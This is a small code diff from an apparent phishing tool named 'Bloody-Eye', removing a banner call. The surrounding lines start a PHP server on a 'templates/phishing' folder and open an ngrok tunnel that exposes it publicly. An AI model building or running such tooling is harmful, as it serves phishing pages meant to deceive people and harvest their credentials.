@@ -556,7 +556,7 @@ exit();""")
     elif v == "02":
       with open("log","w") as phplog:
         Popen(("php","-S","localhost:6060","-t","../Bloody-Eye/templates/phishing"),stderr=phplog,stdout=phplog)
-    banner.banner()
+
     global token
     a = ngrok.connect(4545,"http",auth_token=token)
     print(Fore.GREEN+" [+]"+Fore.WHITE+str(a).replace('"','').replace("NgrokTunnel:","").replace("http://","https://"))
